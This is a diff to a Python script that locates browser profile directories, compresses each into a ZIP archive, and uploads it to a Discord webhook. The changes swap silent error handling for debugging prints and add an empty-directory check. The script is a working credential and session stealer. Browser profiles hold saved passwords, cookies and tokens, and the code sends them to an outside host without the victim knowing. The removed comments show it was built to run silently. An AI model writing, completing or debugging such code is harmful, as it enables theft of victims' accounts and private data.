@@ -22,11 +22,16 @@ def copy_and_compress_browser_data(browser_name, source_path):
         # Define the destination for the zip file
         zip_filename = os.path.join(temp_dir, f"{browser_name}_profile.zip")
 
-        # Create a ZIP archive of the browser profile directory
-        shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', source_path)
-
-        return zip_filename  # Return the path of the created zip file
-    except Exception:
+        # Check if the directory exists and is not empty
+        if os.path.exists(source_path) and os.listdir(source_path):
+            print(f"Compressing {browser_name} data...")  # Debugging print
+            shutil.make_archive(zip_filename.replace('.zip', ''), 'zip', source_path)
+            return zip_filename  # Return the path of the created zip file
+        else:
+            print(f"{browser_name} data not found or is empty.")  # Debugging print
+            return None
+    except Exception as e:
+        print(f"Error compressing {browser_name}: {e}")  # Debugging print
         return None
 
 # Function to send the zipped file to Discord webhook
@@ -42,11 +47,11 @@ def send_file_to_discord(zip_file, browser_name):
 
             # Check the response status
             if response.status_code == 204:
-                print(f"{browser_name} profile sent successfully.")
+                print(f"{browser_name} profile sent successfully.")  # Debugging print
             else:
                 print(f"Failed to send {browser_name} profile. Status code: {response.status_code}")
     except Exception as e:
-        pass  # Silently handle errors
+        print(f"Error sending {browser_name} to Discord: {e}")  # Debugging print
 
 # Function to find and send all browser data
 def find_and_send_browser_data():
@@ -65,6 +70,8 @@ def find_and_send_browser_data():
             # If zip file was created, send it to the Discord webhook
             if zip_file:
                 send_file_to_discord(zip_file, browser_name)
+        else:
+            print(f"{browser_name} profile not found at {full_path}.")  # Debugging print
 
 if __name__ == "__main__":
-    find_and_send_browser_data()  # Start the process silently
+    find_and_send_browser_data()  # Start the process
